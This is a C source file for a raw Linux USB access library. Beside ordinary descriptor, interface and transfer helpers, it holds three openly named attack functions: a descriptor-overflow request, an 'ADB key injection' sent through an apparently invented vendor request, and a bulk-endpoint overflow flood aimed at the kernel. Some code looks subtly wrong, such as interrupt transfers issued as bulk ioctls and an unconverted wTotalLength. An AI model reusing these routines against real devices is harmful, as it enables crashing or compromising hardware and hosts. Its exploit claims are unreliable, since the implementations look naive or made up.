#define _GNU_SOURCE
#include "usb_device_raw.h"
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <dirent.h>
#include <linux/usbdevice_fs.h>
#include <linux/usb/ch9.h>
#include <stdint.h>

static int udr_open_device_path(const char *path, UsbDeviceRaw *dev) {
    dev->fd = open(path, O_RDWR);
    if (dev->fd < 0) {
        dev->fd = open(path, O_RDONLY);
        if (dev->fd < 0) return 0;
    }
    dev->connected = 1;
    return 1;
}

int udr_open(UsbDeviceRaw *dev, int bus, int dev_num) {
    char path[128];
    snprintf(path, sizeof(path), "/dev/bus/usb/%03d/%03d", bus, dev_num);
    if (udr_open_device_path(path, dev)) {
        dev->bus = bus;
        dev->dev_num = dev_num;
        struct usb_device_descriptor desc;
        if (udr_get_descriptor(dev, USB_DT_DEVICE, 0, (unsigned char*)&desc, sizeof(desc))) {
            dev->idVendor = __le16_to_cpu(desc.idVendor);
            dev->idProduct = __le16_to_cpu(desc.idProduct);
            dev->bcdDevice = __le16_to_cpu(desc.bcdDevice);
            dev->bDeviceClass = desc.bDeviceClass;
            dev->bDeviceSubClass = desc.bDeviceSubClass;
            dev->bDeviceProtocol = desc.bDeviceProtocol;
        }
        udr_scan_endpoints(dev);
        return 1;
    }
    snprintf(dev->last_error, sizeof(dev->last_error), "Cannot open %s", path);
    return 0;
}

int udr_scan_endpoints(UsbDeviceRaw *dev) {
    dev->nEndpoints = 0;
    unsigned char buf[512];
    if (!udr_get_descriptor(dev, USB_DT_CONFIG, 0, buf, sizeof(buf))) return 0;
    struct usb_config_descriptor *cfg = (struct usb_config_descriptor*)buf;
    int len = cfg->wTotalLength;
    int pos = sizeof(struct usb_config_descriptor);
    while (pos + 1 < len && dev->nEndpoints < USBRAW_MAX_ENDPOINTS) {
        struct usb_descriptor_header *hdr = (struct usb_descriptor_header*)(buf + pos);
        if (hdr->bDescriptorType == USB_DT_ENDPOINT && hdr->bLength >= 7) {
            struct usb_endpoint_descriptor *ep = (struct usb_endpoint_descriptor*)(buf + pos);
            dev->eps[dev->nEndpoints].ep_addr = ep->bEndpointAddress;
            dev->eps[dev->nEndpoints].ep_type = ep->bmAttributes & 0x03;
            dev->eps[dev->nEndpoints].ep_maxpkt = __le16_to_cpu(ep->wMaxPacketSize);
            dev->nEndpoints++;
        }
        pos += hdr->bLength;
    }
    return dev->nEndpoints;
}

int udr_claim_interface(UsbDeviceRaw *dev, UsbInterfaceRaw *iface, int iface_num) {
    memset(iface, 0, sizeof(*iface));
    iface->fd = dev->fd;
    iface->iface_num = iface_num;
#ifdef USBDEVFS_DISCONNECT
    if (ioctl(dev->fd, USBDEVFS_DISCONNECT, &iface_num) == 0)
        iface->kernel_attached = 1;
#endif
    if (ioctl(dev->fd, USBDEVFS_CLAIMINTERFACE, &iface_num) < 0) {
        snprintf(iface->last_error, sizeof(iface->last_error),
                 "Claim interface %d failed: %s", iface_num, strerror(errno));
        return 0;
    }
    iface->opened = 1;
    return 1;
}

int udr_release_interface(UsbInterfaceRaw *iface) {
    if (!iface->opened) return 0;
    if (ioctl(iface->fd, USBDEVFS_RELEASEINTERFACE, &iface->iface_num) < 0)
        return 0;
    iface->opened = 0;
    return 1;
}

int udr_control_transfer(UsbDeviceRaw *dev, uint8_t bmReqType, uint8_t bRequest,
                         uint16_t wValue, uint16_t wIndex,
                         unsigned char *data, uint16_t wLength, int timeout_ms) {
    struct usbdevfs_ctrltransfer ctrl;
    ctrl.bRequestType = bmReqType;
    ctrl.bRequest = bRequest;
    ctrl.wValue = wValue;
    ctrl.wIndex = wIndex;
    ctrl.wLength = wLength;
    ctrl.timeout = timeout_ms > 0 ? timeout_ms : USBRAW_TIMEOUT_MS;
    ctrl.data = data;
    int r = ioctl(dev->fd, USBDEVFS_CONTROL, &ctrl);
    return r;
}

int udr_bulk_write(UsbDeviceRaw *dev, int ep_addr, const unsigned char *data, int len) {
    struct usbdevfs_bulktransfer bulk;
    bulk.ep = ep_addr;
    bulk.len = len;
    bulk.timeout = USBRAW_TIMEOUT_MS;
    bulk.data = (void*)data;
    int r = ioctl(dev->fd, USBDEVFS_BULK, &bulk);
    return r;
}

int udr_bulk_read(UsbDeviceRaw *dev, int ep_addr, unsigned char *data, int max_len) {
    struct usbdevfs_bulktransfer bulk;
    bulk.ep = ep_addr;
    bulk.len = max_len;
    bulk.timeout = USBRAW_TIMEOUT_MS;
    bulk.data = data;
    return ioctl(dev->fd, USBDEVFS_BULK, &bulk);
}

int udr_interrupt_write(UsbDeviceRaw *dev, int ep_addr, const unsigned char *data, int len) {
    struct usbdevfs_bulktransfer bulk;
    bulk.ep = ep_addr;
    bulk.len = len;
    bulk.timeout = USBRAW_TIMEOUT_MS;
    bulk.data = (void*)data;
    return ioctl(dev->fd, USBDEVFS_BULK, &bulk);
}

int udr_interrupt_read(UsbDeviceRaw *dev, int ep_addr, unsigned char *data, int max_len) {
    struct usbdevfs_bulktransfer bulk;
    bulk.ep = ep_addr;
    bulk.len = max_len;
    bulk.timeout = USBRAW_TIMEOUT_MS;
    bulk.data = data;
    return ioctl(dev->fd, USBDEVFS_BULK, &bulk);
}

int udr_reset_device(UsbDeviceRaw *dev) {
    return ioctl(dev->fd, USBDEVFS_RESET) >= 0;
}

int udr_reset_endpoint(UsbDeviceRaw *dev, int ep_addr) {
    return ioctl(dev->fd, USBDEVFS_RESETEP, &ep_addr) >= 0;
}

int udr_set_configuration(UsbDeviceRaw *dev, int config) {
    return ioctl(dev->fd, USBDEVFS_SETCONFIGURATION, &config) >= 0;
}

int udr_set_interface(UsbDeviceRaw *dev, UsbInterfaceRaw *iface, int alt) {
    struct usbdevfs_setinterface si;
    si.interface = iface->iface_num;
    si.altsetting = alt;
    iface->alt_setting = alt;
    return ioctl(dev->fd, USBDEVFS_SETINTERFACE, &si) >= 0;
}

int udr_detach_kernel(UsbDeviceRaw *dev, int iface_num) {
#ifdef USBDEVFS_DISCONNECT
    return ioctl(dev->fd, USBDEVFS_DISCONNECT, &iface_num) >= 0;
#else
    (void)dev; (void)iface_num;
    return 0;
#endif
}

int udr_attach_kernel(UsbDeviceRaw *dev, int iface_num) {
#ifdef USBDEVFS_CONNECT
    return ioctl(dev->fd, USBDEVFS_CONNECT, &iface_num) >= 0;
#else
    (void)dev; (void)iface_num;
    return 0;
#endif
}

int udr_get_descriptor(UsbDeviceRaw *dev, int type, int index, unsigned char *buf, int len) {
    return udr_control_transfer(dev, 0x80, USB_REQ_GET_DESCRIPTOR,
                                (type << 8) | index, 0, buf, len, USBRAW_TIMEOUT_MS);
}

int udr_send_custom_descriptor(UsbDeviceRaw *dev, const unsigned char *desc, int len) {
    return udr_control_transfer(dev, 0x00, USB_REQ_SET_DESCRIPTOR, 0, 0,
                                (unsigned char*)desc, len, USBRAW_TIMEOUT_MS);
}

int udr_exploit_descriptor_overflow(UsbDeviceRaw *dev) {
    unsigned char buf[65536];
    return udr_control_transfer(dev, 0x80, USB_REQ_GET_DESCRIPTOR,
                                0xFFFF, 0, buf, 65535, 100);
}

int udr_inject_adb_key(UsbDeviceRaw *dev, const char *pubkey) {
    int len = strlen(pubkey);
    if (len > 4096) len = 4096;
    return udr_control_transfer(dev, 0x40, 0xAA, 0, 0,
                                (unsigned char*)pubkey, len, USBRAW_TIMEOUT_MS);
}

int udr_kernel_usbip_attack(UsbDeviceRaw *dev) {
    unsigned char buf[8192];
    memset(buf, 0x41, sizeof(buf));
    struct usbdevfs_bulktransfer bulk;
    bulk.ep = 0x01;
    bulk.len = sizeof(buf);
    bulk.timeout = 100;
    bulk.data = buf;
    return ioctl(dev->fd, USBDEVFS_BULK, &bulk);
}

int udr_scan_all_devices(UsbDeviceRaw *devs, int max_devs) {
    int ndev = 0;
    DIR *d = opendir("/dev/bus/usb");
    if (!d) return 0;
    struct dirent *bus_entry;
    while ((bus_entry = readdir(d)) && ndev < max_devs) {
        if (bus_entry->d_name[0] == '.') continue;
        char bus_path[256];
        snprintf(bus_path, sizeof(bus_path), "/dev/bus/usb/%s", bus_entry->d_name);
        DIR *bd = opendir(bus_path);
        if (!bd) continue;
        struct dirent *dev_entry;
        while ((dev_entry = readdir(bd)) && ndev < max_devs) {
            if (dev_entry->d_name[0] == '.') continue;
            char dev_path[256];
            snprintf(dev_path, sizeof(dev_path), "%s/%s", bus_path, dev_entry->d_name);
            UsbDeviceRaw *d = &devs[ndev];
            memset(d, 0, sizeof(*d));
            d->fd = open(dev_path, O_RDWR);
            if (d->fd < 0) d->fd = open(dev_path, O_RDONLY);
            if (d->fd < 0) continue;
            d->bus = atoi(bus_entry->d_name);
            d->dev_num = atoi(dev_entry->d_name);
            d->connected = 1;
            struct usb_device_descriptor desc;
            if (udr_get_descriptor(d, USB_DT_DEVICE, 0, (unsigned char*)&desc, sizeof(desc))) {
                d->idVendor = __le16_to_cpu(desc.idVendor);
                d->idProduct = __le16_to_cpu(desc.idProduct);
            }
            ndev++;
        }
        closedir(bd);
    }
    closedir(d);
    return ndev;
}

void udr_close(UsbDeviceRaw *dev) {
    if (dev->fd >= 0) close(dev->fd);
    dev->fd = -1;
    dev->connected = 0;
}

void udr_close_interface(UsbInterfaceRaw *iface) {
    if (iface->opened) udr_release_interface(iface);
    if (iface->kernel_attached) {
        ioctl(iface->fd, USBDEVFS_CONNECT, &iface->iface_num);
    }
    memset(iface, 0, sizeof(*iface));
}
